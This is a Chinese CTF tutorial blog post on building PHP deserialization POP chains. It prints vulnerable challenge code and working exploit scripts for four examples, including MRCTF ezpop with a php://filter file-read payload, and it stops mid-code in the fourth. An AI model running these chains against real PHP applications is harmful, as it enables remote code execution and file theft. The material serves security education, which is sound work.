    <content type="html"><![CDATA[<h1 id="pop链的构造-下篇"><a href="#pop链的构造-下篇" class="headerlink" title="pop链的构造(下篇)"></a>pop链的构造(下篇)</h1><p>上篇文章中我们详细介绍了魔术方法及调用它们的条件，那么这篇文章就来研究在实例中如何调用它们，并且把它们连成一条pop链，首先，我们来看看什么是pop链</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>pop又称之为<strong>面向属性编程</strong><code>(Property-Oriented Programing)</code>，常用于上层语言构造特定调用链的方法，与二进制利用中的<strong>面向返回编程</strong><code>(Return-Oriented Programing)</code>的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组<strong>连续的调用链</strong>,最终达到攻击者邪恶的目的；只不过ROP是通过<strong>栈溢出</strong>实现控制指令的执行流程，而我们的反序列化是通过<strong>控制对象的属性</strong>从而实现控制程序的执行流程；因为反序列化中我们能控制的也就只有对象的<strong>属性</strong>了，所以k0rz3n大佬说反序列化漏洞又叫<strong>对象的属性篡改漏洞</strong>，我觉得就很有道理哈哈哈</p><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>任何一条链子的构造，我们都要先找到它的头和尾，pop链也不例外，pop链的头部一般是用户能传入参数的地方，而尾部是可以执行我们操作的地方，比如说读写文件，执行命令等等；找到头尾之后，从尾部(我们执行操作的地方)开始，看它在哪个方法中，怎么样可以调用它，一层一层往上倒推，直到推到头部为止，也就是我们传参的地方，一条pop链子就出来了；在ctf中，头部一般都会是GET或者POST传参，然后可能就有一个<code>unserialize</code>直接将我们传入的参数反序列化了，尾部都是拿flag的地方；然后一环连着一环构成pop链</p><h2 id="例题解析一："><a href="#例题解析一：" class="headerlink" title="例题解析一："></a>例题解析一：</h2><p>一般来说，出现php反序列化漏洞是因为有写的不安全的魔术方法，因为魔术方法会自动调用，那我们就可以构造恶意的exp来触发它，但有的时候如果出现漏洞的代码不在魔术方法中，而是只在一个普通方法中，那我们怎么利用呢？这时候我们可以寻找魔术方法中是否调用了同名的函数，然后通过相同的函数名将类的属性和魔术方法中的属性联系起来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如说上面这个例子，危险函数应该是<code>evil</code>类中的<code>action</code>方法，里面有个<code>eval</code>，但<code>action</code>方法并不是魔术方法，一般情况下我们是很难调用它的，但我们看到<code>test</code>类中的<code>__destruct()</code>调用了<code>action</code>方法，但在<code>__construct()</code>中可以看出它创建了一个<code>normal</code>类的对象，然后调用的是<code>normal</code>类中的<code>action</code>方法；这个就很好办，我们把魔术方法中的属性改一下，改成创建一个<code>evil</code>类的对象，那它自然调用的就是<code>evil</code>类中的<code>action</code>方法了，有了思路下面就来构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="variable">$b</span> -&gt; ClassObj = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(urlencode(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本来构造出来应该是这样，创建一个<code>evil</code>类的对象然后把它赋值给<code>ClassObj</code>属性，但这里这样写不行，因为<code>ClassObj</code>属性是<code>protected</code>属性，不能在类外面访问它，所以说我们得在<code>test</code>类里面写一个<code>__construct()</code>来完成这个操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/CgL5JVlSFiTMs9Z.png" alt="image.png"></p><p>经检验没有问题，这应该是最简单的pop链了，从头到尾只有一步就完成</p><h2 id="例题解析二："><a href="#例题解析二：" class="headerlink" title="例题解析二："></a>例题解析二：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source=<span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getshell(<span class="keyword">$this</span>-&gt;params);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路分析：先找链子的头和尾，头部明显是GET传参，尾部是<code>Uwant</code>类中的<code>getshell</code>，然后往上倒推，<code>Uwant</code>类中的<code>__get()</code>中调用了<code>getshell</code>，<code>Show</code>类中的<code>toString</code>调用了<code>__get()</code>，然后<code>Hello</code>类中的<code>__destruct()</code>，而我们GET传参之后会先进入<code>__destruct()</code>，这样子头和尾就连上了，所以说完整的链子就是：</p><p><code>头 -&gt; Hello::__destruct() -&gt; Show::__toString() -&gt; Uwant::__get() -&gt; Uwant::getshell -&gt; 尾</code></p><p>至于魔术方法具体是怎么调用的这就不讲了，请看上一篇文章，这儿就简单提一下，在<code>Hello</code>类中我们要把<code>$this-&gt;str</code>赋值成对象，下面<code>echo</code>出来才能调用<code>Show</code>类中的<code>__toString()</code>，然后再把<code>Show</code>类中的<code>$this-&gt;str[&#39;str&#39;]</code>赋值成对象，来调用<code>Uwant</code>类中的<code>__get()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$params</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Hello();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Uwant();</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/17/n9vPsLjwZ7hOa4z.png" alt="image.png"></p><p>这样子就出来了，想当初这道题还是我们团队的考核题，那时候我做了半天都没做出来，害，慢慢进步吧哈哈</p><h2 id="例题解析三-——-2020-mrctf-ezpop"><a href="#例题解析三-——-2020-mrctf-ezpop" class="headerlink" title="例题解析三 —— 2020 mrctf ezpop"></a>例题解析三 —— 2020 mrctf ezpop</h2><p>这道题选自mrctf中的ezpop，可以在buuctf上复现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路分析：仍然是先找链子的头和尾，头部依然是一个GET传参，而尾部在<code>Modifier</code>类中的<code>append()</code>方法中，因为里面有个<code>include</code>可以完成任意文件包含，那我们很容易就可以想到用伪协议来读文件，综合上面的提示，应该flag就是在flag.php中，我们把它读出来就好；找到尾部之后往前倒推，在<code>Modifier</code>类中的<code>__invoke()</code>调用了<code>append()</code>，然后在<code>Test</code>类中的<code>__get()</code>返回的是<code>$function()</code>，可以调用<code>__invoke()</code>，再往前<code>Show</code>类中的<code>__toString()</code>可以调用<code>__get()</code>，然后在<code>Show</code>类中的<code>__wakeup()</code>中有一个正则匹配，可以调用<code>__toString()</code>，然后当我们传入字符串，反序列化之后最先进入的就是<code>__wakeup()</code>，这样子头和尾就连上了，如下图(来自LTLT)：</p><p><img src="https://i.loli.net/2021/08/17/7KHtl9Vrvqxy6TO.png" alt="image.png"></p><p><code>头 -&gt; Show::__wakeup() -&gt; Show::__toString() -&gt; Test::__get() -&gt; Modifier::__invoke() -&gt; Modifier::append -&gt; 尾</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$a</span> -&gt; source = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; p = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/17/GIdZ3vsAupmLhf4.png" alt="image.png"></p><p>成功拿下</p><h2 id="例题解析四-——-2021-强网杯-赌徒"><a href="#例题解析四-——-2021-强网杯-赌徒" class="headerlink" title="例题解析四 —— 2021 强网杯 赌徒"></a>例题解析四 —— 2021 强网杯 赌徒</h2><p>这道题选自2021年强网杯，名字为赌徒：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span 